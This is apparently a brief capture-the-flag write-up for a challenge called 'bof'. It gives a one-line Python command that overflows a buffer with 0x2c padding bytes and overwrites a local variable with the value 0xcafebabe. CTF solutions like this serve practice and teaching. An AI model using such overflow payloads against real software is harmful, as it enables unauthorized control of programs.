### bof

Description : 

Difficulty : 4/5 

##### Exploit

Simple buffer overflow to overwrite local variable.

``` python
python -c 'print "A" * 0x2c + "\xca\xfe\xba\xbe"[::-1]' | ./bof
```





